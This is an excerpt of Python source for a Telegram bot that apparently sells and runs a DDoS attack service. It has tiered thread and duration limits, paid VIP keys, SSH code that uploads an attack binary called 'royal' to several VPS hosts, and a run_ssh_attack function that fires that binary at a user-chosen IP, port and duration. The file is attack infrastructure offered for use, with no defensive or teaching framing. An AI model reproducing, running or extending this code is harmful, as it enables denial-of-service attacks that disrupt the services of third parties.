...
OWNER_USERNAME = RAHUL_MODS_OWNER
ADMIN_IDS = [RAHUL_MODS_OWNER, "ROYALTHAKURJSP"]  # Add admin usernames here
ALLOWED_GROUP_IDS = [-1002596416529]
MAX_THREADS = 1000
MAX_DURATION = 300
SPECIAL_MAX_THREADS = 1200
SPECIAL_MAX_DURATION = 420
VIP_MAX_THREADS = 1500
VIP_MAX_DURATION = 500
ACTIVE_VPS_COUNT = 4
BINARY_PATH = "/home/master/royal/royal"
BINARY_NAME = "royal"
...
🔰 *𝗚𝗿𝗼𝘂𝗽 𝗢𝘄𝗻𝗲𝗿:* {owner_name}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
▶️ Buy special key to unlock VIP features Dm @ROYALTHAKUROFFICIAL !
"""
        markup = create_main_keyboard(message)
...
def show_vps_status(message):
    ...
    for i, vps in enumerate(VPS_LIST):
        ...
        try:
            ...
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/royal/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "❌ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱"
            else:
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/royal/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
...
def delete_key_start(message):
    ...
    safe_reply_to(message, 
        ...
        "𝗙𝗼𝗿𝗺𝗮𝘁: <𝗸𝗲𝘆>\n"
        "𝗘𝘅𝗮𝗺𝗽𝗹𝗲: ROYALTHAKUROFFICIAL-1H-ABC123",
        parse_mode="Markdown")
...
def run_ssh_attack(vps, ip, port, duration, threads, attack_id, attack_num, chat_id, user_id, is_vip, msg_id, country, flag, protection, is_public=False):
    ...
    try:
        ...
        command = f"{BINARY_PATH} {ip} {port} {duration}"
...
def upload_binary_start(message):
    ...
    safe_reply_to(message,
        ...
        "𝟮. 𝗠𝘂𝘀𝘁 𝗯𝗲 𝗻𝗮𝗺𝗲𝗱: `royal`\n"
        "𝟯. 𝗪𝗶𝗹𝗹 𝗯𝗲 𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗱 𝘁𝗼: `/home/master/royal/`\n\n"
    ...
    for vps in VPS_LIST[:ACTIVE_VPS_COUNT]:  # Only active VPS
        ...
        try:
            ...
            with SCPClient(ssh.get_transport()) as scp:
                scp.put(temp_path, f"/home/master/royal/{BINARY_NAME}")
            
            # Make executable
            ssh.exec_command(f"chmod +x /home/master/royal/{BINARY_NAME}")
            
            # Verify
            stdin, stdout, stderr = ssh.exec_command(f"ls -la /home/master/royal/{BINARY_NAME}")
...
def delete_binary_all_vps(message):
    ...
    for vps in VPS_LIST:
        try:
            ...
            ssh.exec_command(f"rm -f /home/master/royal/{BINARY_NAME}")
            ssh.close()
            success += 1
...
def handle_notice_confirmation(call):
    ...
    def send_notice(chat_id):
        try:
            caption = f"»»—— ROYAL THAKUR OFFICIAL ♥ OFFICIAL NOTICE \n\n{notice['content']}" if notice['content'] else "---------------------"

            if notice['type'] == 'text':
                safe_send_message(chat_id, caption, content_type='text')
            else:
                safe_send_message(chat_id, notice['file_id'], content_type=notice['type'], caption=caption)
...
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"""
    safe_send_message(call.message.chat.id, report, content_type='text', caption=None)
...
def generate_referral(message):
    ...
    if user_id in REFERRAL_CODES:
        ...
        code = f"Royalthakurofficial-{user_id[:4]}-{os.urandom(2).hex().upper()}"
...
def get_vps_health(ip, username, password):
    ...
    try:
        ...
        stdin, stdout, stderr = ssh.exec_command(f"test -x /home/master/royal/{BINARY_NAME} && echo 'Executable' || echo 'Not executable'")
...
if __name__ == '__main__':
    load_data()
    load_admins()
    print("𝗕𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗹𝗮𝘂𝗻𝗰𝗵𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! »»—— ROYAL THAKUR OFFICIAL ♥")
